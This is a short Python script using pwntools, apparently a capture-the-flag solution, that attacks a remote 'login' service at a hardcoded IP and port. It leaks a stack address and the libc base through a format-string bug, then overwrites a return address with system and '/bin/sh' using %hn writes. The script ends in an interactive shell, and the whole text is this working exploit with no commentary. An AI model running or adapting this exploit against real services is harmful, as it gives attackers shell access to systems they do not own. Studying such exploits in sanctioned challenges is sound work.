from pwn import *
context.log_level = 'debug'
#p = process("./login")
p = remote("108.160.139.79", 9090)
p.sendlineafter("name: ", 'a')

payload  = '%6$p-%15$p'
p.sendlineafter("password: ", payload)
p.recvuntil("0x")
ret_addr = int(p.recv(8), 16)+36
ret_addr2 = ret_addr+8
p.recvuntil("0x")
libc_base = int(p.recv(8), 16)-0x18e81
log.info('ret_addr: '+hex(ret_addr))
log.info('libc_base: '+hex(libc_base))

system = libc_base+0x3cd10
binsh = libc_base+0x17b8cf
one = libc_base + 0x3cbea
#gdb.attach(p, 'b*0x80485af\nb* 0x8048692')
payload = '%' + str(ret_addr&0xffff) + 'c%21$hn'
p.sendlineafter("Try again!", payload)
payload = '%' + str(system&0xffff) + 'c%57$hn'
p.sendlineafter("Try again!", payload)
payload = '%' + str(ret_addr+2&0xffff) + 'c%21$hn'
p.sendlineafter("Try again!", payload)
payload = '%' + str((system>>16)&0xffff) + 'c%57$hn'
p.sendlineafter("Try again!", payload)

payload = '%' + str(ret_addr2&0xffff) + 'c%22$hn'
p.sendlineafter("Try again!", payload)
payload = '%' + str(binsh&0xffff) + 'c%59$hn'
p.sendlineafter("Try again!", payload)
payload = '%' + str(ret_addr2+2&0xffff) + 'c%22$hn'
p.sendlineafter("Try again!", payload)
payload = '%' + str((binsh>>16)&0xffff) + 'c%59$hn'
p.sendlineafter("Try again!", payload)
p.sendlineafter("Try again!", 'wllmmllw')
p.interactive()